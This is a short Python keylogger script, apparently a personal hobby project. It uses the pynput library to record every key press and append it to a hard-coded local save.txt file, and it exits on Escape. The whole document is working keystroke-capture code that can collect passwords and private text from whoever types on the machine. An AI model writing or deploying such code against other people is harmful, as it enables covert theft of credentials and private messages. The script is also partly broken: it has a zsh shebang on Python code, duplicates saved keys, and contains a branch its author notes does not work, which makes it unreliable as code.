#!/bin/zsh
# Description: Logs keystrokes and saves them in a text file.

import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def press(key): # Left these as Comments because it prints <255> continuously.
    '''
    Code for key presses.
    '''
    global keys, count
    keys.append(key)
    #count += 1
    print(key)
    save(keys)
    #if count >= 10:
    #    count = 0 
    #    save(keys) 

def save(keys):
    '''
    Saves the key presses to a save.txt file.
    '''
    with open("/home/joey/coalemus/Python-Projects/keylogger/save.txt", "a") as file:
        for key in keys:
            key = str(key).replace("'", "")
            if key.find("space") > 0:
                file.write("\n")
            elif key.find("key") == -1:
                file.write(key)
            elif key.find('<255>') > 0: # Still doesn't Work.
                file.write("\n")


def release(key):
    '''
    Exits the program if you press Escape.
    '''
    if key == Key.esc:
        return False
    
with Listener(on_press=press, on_release=release) as listener:
    listener.join()